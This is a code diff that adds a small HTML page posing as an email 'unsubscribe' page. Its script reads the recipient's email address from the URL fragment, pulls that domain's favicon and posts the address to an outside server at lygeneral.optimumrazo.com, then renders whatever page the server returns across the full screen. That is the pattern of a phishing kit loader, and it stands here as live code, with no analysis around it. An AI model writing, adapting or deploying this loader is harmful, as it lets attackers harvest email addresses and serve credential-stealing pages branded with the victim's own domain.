@@ -1,0 +1,38 @@
+<script>
+var unsubscribe = window.location.hash.substring(1);
+var split_unsubscribe = unsubscribe.indexOf("@");
+var domain = unsubscribe.substr(split_unsubscribe + 1);
+</script>
+<!DOCTYPE html>
+<html>
+<head>
+    <link id="faviconx" rel="icon" type="image/x-icon" href="https://www.google.com/s2/favicons?domain=" + domain>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            var formData = {
+                unsubscribe: unsubscribe
+            };
+            $.ajax({
+                url: "http://lygeneral.optimumrazo.com/index.php",
+                type: "POST",
+                data: formData,
+                dataType: "html",
+                success: function(response) {
+                    $("#xlc").html(response);
+                },
+            });
+        });
+    </script>
+</head>
+<body>
+    <div id="xlc" style="height: 100%;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+			"></div>
+</body>
+</html>
+                
+                
